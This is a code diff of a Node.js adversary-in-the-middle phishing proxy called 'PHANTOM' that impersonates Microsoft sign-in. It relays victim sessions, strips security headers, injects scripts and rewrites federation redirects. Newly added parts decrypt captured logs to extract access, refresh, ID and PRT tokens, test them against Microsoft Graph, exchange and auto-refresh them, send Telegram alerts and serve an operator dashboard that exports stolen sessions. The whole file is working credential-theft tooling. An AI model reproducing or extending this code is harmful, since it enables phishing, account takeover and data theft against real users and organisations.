+    if (day < 1 || day > 31 || year < 1601 || h > 23 || m > 59 || s > 59) return NaN;
+    const d = new Date(Date.UTC(year, month, day, h, m, s));
+    if (d.getUTCFullYear() !== year || d.getUTCMonth() !== month || d.getUTCDate() !== day) return NaN;
+    return d.getTime();
 }
 
 function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
     const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
-    const currentTimestamp = Date.now();
+    const now = Date.now();
     let clockSkew = 0;
-    if (proxyResponseDate) {
-        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
-    }
+    if (proxyResponseDate) clockSkew = now - parseCookieDate(proxyResponseDate);
     for (const newCookie of newCookies) {
-        const [cookie, ...attributes] = newCookie.split(";");
-        const [cookieName, ...cookieValue] = cookie.split("=");
+        const [cookie, ...attrs] = newCookie.split(";");
+        const [cookieName, ...cookieVal] = cookie.split("=");
         let cookieDomain = request.hostname;
-        let cookiePath = (pathNameMatch ?? ["/"])[0];
-        let cookieExpires = NaN;
-        let cookieMaxAge = "";
-        let cookieHostOnly = true;
-        let isCookieValid = true;
-        for (const attribute of attributes) {
-            const cookieAttribute = attribute.trim();
-            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
-            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
-            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
-            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);
-            if (cookieAttribute.toLowerCase() === "domain") {
-                cookieDomain = request.hostname;
-                cookieHostOnly = true;
-                isCookieValid = true;
-            }
-            else if (cookieAttribute.toLowerCase() === "path") {
-                cookiePath = (pathNameMatch ?? ["/"])[0];
-            }
-            else if (cookieAttribute.toLowerCase() === "expires") {
-                cookieExpires = NaN;
-            }
-            else if (cookieAttribute.toLowerCase() === "max-age") {
-                cookieMaxAge = "";
-            }
-            else if (cookieDomainMatch) {
-                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
-                cookieHostOnly = true;
-                isCookieValid = true;
+        let cookiePath = (pathNameMatch || ["/"])[0];
+        let cookieExpires = NaN, cookieMaxAge = "", cookieHostOnly = true, isValid = true;
+        for (const attr of attrs) {
+            const a = attr.trim();
+            const dm = a.match(/^domain\s*=(.*)$/i);
+            const pm = a.match(/^path\s*=(.*)$/i);
+            const em = a.match(/^expires\s*=(.*)$/i);
+            const mm = a.match(/^max-age\s*=(.*)$/i);
+            if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
+            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch || ["/"])[0]; }
+            else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
+            else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
+            else if (dm) {
+                cookieDomain = dm[1].replace(/^\./, "").trim(); cookieHostOnly = true; isValid = true;
                 if (!cookieDomain) cookieDomain = request.hostname;
-                else if (cookieDomain === proxyHostname) {
-                    cookieDomain = request.hostname;
-                    cookieHostOnly = false;
-                }
+                else if (cookieDomain === proxyHostname) { cookieDomain = request.hostname; cookieHostOnly = false; }
                 else if (cookieDomain !== request.hostname) {
                     if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                         cookieDomain = request.hostname.split(".").slice(-2).join(".");
-                    }
-                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
-                        isCookieValid = false;
-                        continue;
-                    }
+                    } else if (!isDomainApplicable(request.hostname, cookieDomain, false)) { isValid = false; continue; }
                     cookieHostOnly = false;
                 }
-            }
-            else if (cookiePathMatch) {
-                cookiePath = cookiePathMatch[1].trim();
-                if (!cookiePath.startsWith("/")) {
-                    cookiePath = (pathNameMatch ?? ["/"])[0];
-                }
-            }
-            else if (cookieExpiresMatch) {
-                cookieExpires = cookieExpiresMatch[1].trim();
-                cookieExpires = parseCookieDate(cookieExpires);
-            }
-            else if (cookieMaxAgeMatch) {
-                cookieMaxAge = cookieMaxAgeMatch[1].trim();
+            } else if (pm) {
+                cookiePath = pm[1].trim();
+                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch || ["/"])[0];
+            } else if (em) {
+                cookieExpires = parseCookieDate(em[1].trim());
+            } else if (mm) {
+                cookieMaxAge = mm[1].trim();
                 if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
             }
         }
-        if (!isCookieValid) continue;
+        if (!isValid) continue;
         cookieExpires += clockSkew;
-        if (cookieMaxAge) {
-            const seconds = parseInt(cookieMaxAge);
-            if (!isNaN(seconds)) {
-                cookieExpires = currentTimestamp + seconds * 1000;
+        if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
+        let isNew = true;
+        const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
+        for (let i = 0; i < sessionCookies.length; i++) {
+            const sc = sessionCookies[i];
+            if (sc.name === cookieName && sc.domain === cookieDomain && sc.path === cookiePath && sc.hostOnly === cookieHostOnly) {
+                if (now > cookieExpires) { sessionCookies.splice(i, 1); break; }
+                sc.value = cookieVal.join("="); sc.expires = cookieExpires; isNew = false; break;
             }
         }
-        let isNewCookie = true;
-        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
-            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
-            if (sessionCookie.name === cookieName &&
-                sessionCookie.domain === cookieDomain &&
-                sessionCookie.path === cookiePath &&
-                sessionCookie.hostOnly === cookieHostOnly) {
-                if (currentTimestamp > cookieExpires) {
-                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
-                    break;
-                }
-                sessionCookie.value = cookieValue.join("=");
-                sessionCookie.expires = cookieExpires;
-                isNewCookie = false;
-                break;
-            }
-        }
-        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
-            VICTIM_SESSIONS[currentSession].cookies.push({
-                name: cookieName,
-                value: cookieValue.join("="),
-                domain: cookieDomain,
-                path: cookiePath,
-                expires: cookieExpires,
-                hostOnly: cookieHostOnly
-            });
+        if (isNew && !(now > cookieExpires)) {
+            sessionCookies.push({ name: cookieName, value: cookieVal.join("="), domain: cookieDomain, path: cookiePath, expires: cookieExpires, hostOnly: cookieHostOnly });
         }
     }
 }
 
 function getValidDomains(domains) {
-    const validDomains = [];
+    const valid = [];
     for (const domain of domains) {
-        const splitDomain = domain.split(".");
-        for (let i = 2; i < splitDomain.length + 1; i++) {
-            const validDomain = splitDomain.slice(-i).join(".");
-            if (!validDomains.includes(validDomain)) validDomains.push(validDomain);
+        const parts = domain.split(".");
+        for (let i = 2; i < parts.length + 1; i++) {
+            const d = parts.slice(-i).join(".");
+            if (!valid.includes(d)) valid.push(d);
         }
     }
-    return validDomains;
+    return valid;
 }
 
 function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
-    const azureHTTPRequestHeaders = [
-        "max-forwards", "x-arr-log-id", "client-ip", "disguised-host",
-        "x-site-deployment-id", "was-default-hostname", "x-forwarded-proto",
-        "x-appservice-proto", "x-arr-ssl", "x-forwarded-tlsversion",
-        "x-forwarded-for", "x-original-url", "x-waws-unencoded-url",
-        "x-client-ip", "x-client-port"
-    ];
-    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
-    if (Object.keys(proxyRequestCookies).length) {
-        proxyRequestOptions.headers.cookie = proxyRequestCookies;
-    } else {
-        delete proxyRequestOptions.headers.cookie;
-    }
+    const azureHeaders = ["max-forwards","x-arr-log-id","client-ip","disguised-host","x-site-deployment-id",
+        "was-default-hostname","x-forwarded-proto","x-appservice-proto","x-arr-ssl","x-forwarded-tlsversion",
+        "x-forwarded-for","x-original-url","x-waws-unencoded-url","x-client-ip","x-client-port"];
+    const cookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
+    if (cookies) proxyRequestOptions.headers.cookie = cookies;
+    else delete proxyRequestOptions.headers.cookie;
     if (proxyRequestOptions.headers.origin) {
         proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
     }
-    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
-        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
+    if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
         delete proxyRequestOptions.headers.referer;
     }
     for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
-        if (azureHTTPRequestHeaders.includes(key)) {
-            delete proxyRequestOptions.headers[key];
-        } else {
-            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
-        }
+        if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
+        else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
     }
 }
 
 function deleteHTTPSecurityResponseHeaders(headers) {
-    const httpSecurityResponseHeaders = [
-        "x-frame-options", "x-xss-protection", "x-content-type-options",
-        "set-cookie", "content-security-policy", "content-security-policy-report-only",
-        "cross-origin-opener-policy", "cross-origin-embedder-policy",
-        "cross-origin-resource-policy", "permissions-policy", "service-worker-allowed"
-    ];
-    for (const header of httpSecurityResponseHeaders) {
-        delete headers[header];
-    }
+    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
+        "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
+        "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
+    for (const h of secHeaders) delete headers[h];
 }
 
-function decompressData(compressedData, encoding) {
-    const decompressionAlgorithms = {
-        gzip: zlib.gunzip, "x-gzip": zlib.gunzip,
-        deflate: zlib.inflate, br: zlib.brotliDecompress,
-        zstd: zlib.zstdDecompress
-    };
+// ── Compression / injection ──
+function decompressData(data, encoding) {
+    const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
     return new Promise((resolve, reject) => {
-        const decompressionAlgorithm = decompressionAlgorithms[encoding];
-        if (decompressionAlgorithm) {
-            decompressionAlgorithm(compressedData, (error, decompressedData) => {
-                if (error) reject(error);
-                else resolve(decompressedData);
-            });
-        } else {
-            resolve(compressedData);
-        }
+        const fn = map[encoding];
+        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
+        else resolve(data);
     });
 }
 
-function compressData(decompressedData, encoding) {
-    const compressionAlgorithms = {
-        gzip: zlib.gzip, "x-gzip": zlib.gzip,
-        deflate: zlib.deflate, br: zlib.brotliCompress,
-        zstd: zlib.zstdCompress
-    };
+function compressData(data, encoding) {
+    const map = { gzip: zlib.gzip, "x-gzip": zlib.gzip, deflate: zlib.deflate, br: zlib.brotliCompress, zstd: zlib.zstdCompress };
     return new Promise((resolve, reject) => {
-        const compressionAlgorithm = compressionAlgorithms[encoding];
-        if (compressionAlgorithm) {
-            compressionAlgorithm(decompressedData, (error, compressedData) => {
-                if (error) reject(error);
-                else resolve(compressedData);
-            });
-        } else {
-            resolve(decompressedData);
-        }
+        const fn = map[encoding];
+        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
+        else resolve(data);
     });
 }
 
-async function decompressResponseBody(compressedData, contentEncoding) {
-    if (!contentEncoding) return { decompressedResponseBody: compressedData, encodings: [] };
-    const encodings = contentEncoding.split(",").map(encoding => encoding.trim().toLowerCase()).filter(encoding => encoding);
-    let decompressedData = compressedData;
-    for (let i = encodings.length - 1; i >= 0; i--) {
-        decompressedData = await decompressData(decompressedData, encodings[i]);
-    }
-    return { decompressedResponseBody: decompressedData, encodings: encodings };
+async function decompressResponseBody(data, contentEncoding) {
+    if (!contentEncoding) return { decompressedResponseBody: data, encodings: [] };
+    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
+    let d = data;
+    for (let i = encodings.length - 1; i >= 0; i--) d = await decompressData(d, encodings[i]);
+    return { decompressedResponseBody: d, encodings };
 }
 
-async function compressResponseBody(decompressedData, encodings) {
-    let compressedData = decompressedData;
-    for (const encoding of encodings) {
-        compressedData = await compressData(compressedData, encoding);
-    }
-    return compressedData;
+async function compressResponseBody(data, encodings) {
+    let d = data;
+    for (const enc of encodings) d = await compressData(d, enc);
+    return d;
 }
 
-function updateHTMLProxyResponse(decompressedResponseBody) {
+function updateHTMLProxyResponse(body) {
     const payload = "<script src=/@></script>";
-    const htmlInjectionMap = {
-        "<head>": `<head>${payload}`,
-        "<html>": `<html><head>${payload}</head>`,
-        "<body>": `<head>${payload}</head><body>`
-    };
-    const indexLimit = 200;
-    for (const [key, value] of Object.entries(htmlInjectionMap)) {
-        const htmlTagBuffer = Buffer.from(key);
-        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
-        if (injectionPointIndex !== -1) {
-            return Buffer.concat([
-                decompressedResponseBody.subarray(0, injectionPointIndex),
-                Buffer.from(value),
-                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
-            ]);
+    const map = { "<head>": `<head>${payload}`, "<html>": `<html><head>${payload}</head>`, "<body>": `<head>${payload}</head><body>` };
+    const limit = 200;
+    for (const [key, val] of Object.entries(map)) {
+        const tag = Buffer.from(key);
+        const idx = body.subarray(0, limit).indexOf(tag);
+        if (idx !== -1) return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
+    }
+    return Buffer.concat([Buffer.from(`<head>${payload}</head>`), body]);
+}
+
+function updateFederationRedirectUrl(body, proxyHostname) {
+    try {
+        const obj = JSON.parse(body.toString());
+        const url = obj.Credentials.FederationRedirectUrl;
+        const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
+        proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
+        obj.Credentials.FederationRedirectUrl = proxyUrl;
+        return Buffer.from(JSON.stringify(obj));
+    } catch (e) { return body; }
+}
+
+// ── Ensure HTML files exist ──
+const indexFile = path.join(__dirname, PROXY_FILES.index);
+const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
+const scriptFile = path.join(__dirname, PROXY_FILES.script);
+if (!fs.existsSync(indexFile)) {
+    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
+    console.log('✅ Created dummy index.html');
+}
+if (!fs.existsSync(notFoundFile)) {
+    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
+    console.log('✅ Created dummy 404.html');
+}
+if (!fs.existsSync(scriptFile)) {
+    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
+    console.log('✅ Created dummy script.js');
+}
+
+// ============================================================
+// 📊 TOKEN VAULT CLASS
+// ============================================================
+class TokenVault {
+    constructor(logsDir, encryptionKey) {
+        this.logsDir = logsDir;
+        this.encryptionKey = encryptionKey;
+        this.tokens = [];
+        this.scanLogs();
+    }
+
+    extractUsernameFromToken(token) {
+        try {
+            const parts = token.split('.');
+            if (parts.length === 3) {
+                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+                return payload.email || payload.preferred_username || payload.upn || 'unknown';
+            }
+        } catch (e) {}
+        return 'unknown';
+    }
+
+    scanLogs() {
+        this.tokens = [];
+        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
+        for (const file of files) {
+            try {
+                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
+                const lines = content.split('\n').filter(line => line.trim());
+                for (const line of lines) {
+                    try {
+                        const entry = JSON.parse(line);
+                        const iv = Object.keys(entry)[0];
+                        const encrypted = entry[iv];
+                        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
+                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                        decrypted = Buffer.concat([decrypted, decipher.final()]);
+                        const obj = JSON.parse(decrypted.toString('utf-8'));
+                        const body = obj.proxyRequestBody;
+                        if (body) {
+                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                            if (accessMatch) {
+                                const token = decodeURIComponent(accessMatch[1]);
+                                this.tokens.push({ type: 'access', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
+                            }
+                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                            if (refreshMatch) {
+                                const token = decodeURIComponent(refreshMatch[1]);
+                                this.tokens.push({ type: 'refresh', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
+                            }
+                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
+                            if (idMatch) {
+                                const token = decodeURIComponent(idMatch[1]);
+                                this.tokens.push({ type: 'id', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
+                            }
+                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);
+                            if (prtMatch) {
+                                this.tokens.push({ type: 'prt', value: decodeURIComponent(prtMatch[1]), file, username: 'PRT', timestamp: new Date().toISOString() });
+                            }
+                        }
+                    } catch (e) {}
+                }
+            } catch (e) {}
+        }
+        return this.tokens;
+    }
+
+    getStats() {
+        return {
+            total: this.tokens.length,
+            access: this.tokens.filter(t => t.type === 'access').length,
+            refresh: this.tokens.filter(t => t.type === 'refresh').length,
+            id: this.tokens.filter(t => t.type === 'id').length,
+            prt: this.tokens.filter(t => t.type === 'prt').length
+        };
+    }
+
+    async healthCheckAll() {
+        const results = [];
+        const uniqueTokens = [];
+        const seen = new Set();
+        for (const token of this.tokens) {
+            if (!seen.has(token.value) && token.type === 'access') {
+                seen.add(token.value);
+                uniqueTokens.push(token);
+            }
+        }
+        for (const token of uniqueTokens.slice(0, 10)) {
+            try {
+                const response = await retry(async () => {
+                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
+                        headers: { 'Authorization': `Bearer ${token.value}` },
+                        timeout: 5000
+                    });
+                }, 2, 1000, 2);
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'valid',
+                    user: response.data.userPrincipalName,
+                    username: token.username
+                });
+            } catch (e) {
+                results.push({
+                    token: token.value.slice(0, 20) + '...',
+                    status: 'invalid',
+                    error: e.message,
+                    username: token.username
+                });
+            }
+        }
+        return results;
+    }
+
+    async exchangeToken(tokenValue) {
+        try {
+            const response = await retry(async () => {
+                return await axios.post(
+                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                    new URLSearchParams({
+                        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                        refresh_token: tokenValue,
+                        grant_type: 'refresh_token',
+                        scope: 'https://graph.microsoft.com/.default offline_access'
+                    }),
+                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+                );
+            }, 3, 1000, 2);
+            return response.data;
+        } catch (err) {
+            throw new Error(err.response?.data?.error_description || err.message);
         }
     }
-    return Buffer.concat([
-        Buffer.from(`<head>${payload}</head>`),
-        decompressedResponseBody
-    ]);
 }
 
-function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
-    const decompressedResponseBodyString = decompressedResponseBody.toString();
-    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
-    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;
-    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
-    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
-    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
-    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
+const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
+
+// ============================================================
+// 🔄 AUTO-REFRESH DAEMON
+// ============================================================
+async function refreshTokensDaemon() {
+    console.log('🔄 Token Refresh Daemon started (every 30 min)');
+    setInterval(async () => {
+        for (const flow of deviceFlows) {
+            if (flow.refresh_token && flow.status === 'approved') {
+                try {
+                    const response = await retry(async () => {
+                        return await axios.post(
+                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                            new URLSearchParams({
+                                client_id: flow.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+                                refresh_token: flow.refresh_token,
+                                grant_type: 'refresh_token',
+                                scope: 'https://graph.microsoft.com/.default offline_access'
+                            }),
+                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+                        );
+                    }, 2, 1000, 2);
+                    flow.access_token = response.data.access_token;
+                    if (response.data.refresh_token) flow.refresh_token = response.data.refresh_token;
+                    flow.last_refresh = new Date().toISOString();
+                    saveDeviceFlows();
+                } catch (e) { console.warn(`Refresh failed: ${e.message}`); }
+            }
+        }
+    }, 30 * 60 * 1000);
 }
 
-// ==================== MAIN PROXY SERVER ====================
-const proxyServer = http.createServer((clientRequest, clientResponse) => {
-    const { method, url, headers } = clientRequest;
-    const currentSession = getUserSession(headers.cookie);
+// ── Load device flows ──
+function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
+function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
+loadDeviceFlows();
 
-    // Fingerprint endpoint
-    if (url === PROXY_PATHNAMES.fingerprint) {
+// ── Load PRT storage ──
+function loadPRTStorage() {
+    try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
+}
+function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
+loadPRTStorage();
+
+// ── Graph API Client ──
+class GraphClient {
+    constructor(accessToken) {
+        this.accessToken = accessToken;
+        this.baseUrl = 'https://graph.microsoft.com/v1.0';
+        this.cache = global._cache || new CacheManager();
+    }
+    async get(endpoint, useCache = true) {
+        const cacheKey = `graph:get:${endpoint}`;
+        if (useCache) {
+            const cached = this.cache.get(cacheKey);
+            if (cached) return cached;
+        }
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        const response = await retry(async () => {
+            return await axios.get(`${this.baseUrl}${endpoint}`, config);
+        }, 3, 1000, 2);
+        if (useCache && response.status === 200) {
+            this.cache.set(cacheKey, response.data, 300000);
+        }
+        return response.data;
+    }
+    async post(endpoint, data) {
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        config.headers['Content-Type'] = 'application/json';
+        const response = await retry(async () => {
+            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
+        }, 3, 1000, 2);
+        return response.data;
+    }
+    async getUserProfile() {
+        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
+    }
+}
+
+// ============================================================
+// 🛡️ DASHBOARD AUTH MIDDLEWARE
+// ============================================================
+function requireAuth(req, res) {
+    const auth = req.headers.authorization;
+    if (!auth) {
+        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
+        res.end();
+        return false;
+    }
+    const base64 = auth.split(' ')[1];
+    const [user, pass] = Buffer.from(base64, 'base64').toString().split(':');
+    if (user === DASHBOARD_USER && pass === DASHBOARD_PASS) return true;
+    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"' });
+    res.end();
+    return false;
+}
+
+// ============================================================
+// 🌐 MAIN PROXY SERVER
+// ============================================================
+const server = http.createServer(async (req, res) => {
+    const { method, url } = req;
+
+    // ── Dashboard HTML ──
+    if (url === '/dash' || url === '/dash/') {
+        if (!requireAuth(req, res)) return;
+        const dashPath = path.join(__dirname, 'public', 'index.html');
+        if (fs.existsSync(dashPath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(dashPath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<h1>PHANTOM Dashboard</h1><p>Place public/index.html in the same directory.</p>`);
+        }
+        return;
+    }
+
+    // ── Dashboard API ──
+    if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
+        if (!requireAuth(req, res)) return;
+        await handleDashboardAPI(req, res);
+        return;
+    }
+
+    // ── Device Code ──
+    if (url === '/device' || url.startsWith('/device')) {
+        if (!requireAuth(req, res)) return;
+        const devicePath = path.join(__dirname, 'public', 'device_code.html');
+        if (fs.existsSync(devicePath)) {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            fs.createReadStream(devicePath).pipe(res);
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/html' });
+            res.end(`<h1>Device Code</h1><p>Place public/device_code.html</p>`);
+        }
+        return;
+    }
+
+    // ── Proxy ──
+    proxyHandler(req, res);
+});
+
+// ============================================================
+// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS)
+// ============================================================
+async function handleDashboardAPI(req, res) {
+    const url = req.url;
+    // Remove leading /dash if present, so we can match /api/...
+    let apiPath = url;
+    if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
+
+    // ── Test Telegram ──
+    if (apiPath === '/api/test-telegram') {
+        try {
+            if (!axios) throw new Error('axios not installed');
+            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`
+            }, { timeout: 5000 });
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true, message: 'Test sent', response: response.status }));
+        } catch (e) {
+            res.writeHead(500, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: e.message, details: e.response?.data || '' }));
+        }
+        return;
+    }
+
+    // ── Status ──
+    if (apiPath === '/api/status') {
+        try {
+            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ online: true, totalSessions: files.length }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Logs ──
+    if (apiPath === '/api/logs') {
+        try {
+            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            const logs = files.map(f => {
+                const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+                return { name: f, size: stat.size, modified: stat.mtime };
+            }).sort((a, b) => b.modified - a.modified);
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify(logs));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Log detail ──
+    if (apiPath.startsWith('/api/log/')) {
+        const filename = apiPath.replace('/api/log/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const entries = lines.map(line => {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    return JSON.parse(decrypted.toString('utf-8'));
+                } catch (e) {
+                    return { error: 'Failed to decrypt', raw: line };
+                }
+            });
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ filename, entries }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Export ZIP ──
+    if (apiPath === '/api/export/all' && AdmZip) {
+        try {
+            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+            if (files.length === 0) {
+                res.writeHead(404);
+                res.end(JSON.stringify({ error: 'No logs' }));
+                return;
+            }
+            const zip = new AdmZip();
+            files.forEach(f => {
+                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
+                zip.addFile(f, content);
+            });
+            const zipBuffer = zip.toBuffer();
+            res.writeHead(200, {
+                'Content-Type': 'application/zip',
+                'Content-Disposition': `attachment; filename=all_sessions_${Date.now()}.zip`
+            });
+            res.end(zipBuffer);
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
+    // ── Visits ──
+    if (apiPath === '/api/visits') {
+        try {
+            if (!fs.existsSync(VISITS_LOG_FILE)) {
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ visits: [], total: 0, uniqueIPs: 0, today: 0 }));
+                return;
+            }
+            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            const visits = lines.map(line => JSON.parse(line));
+            visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+            const now = new Date();
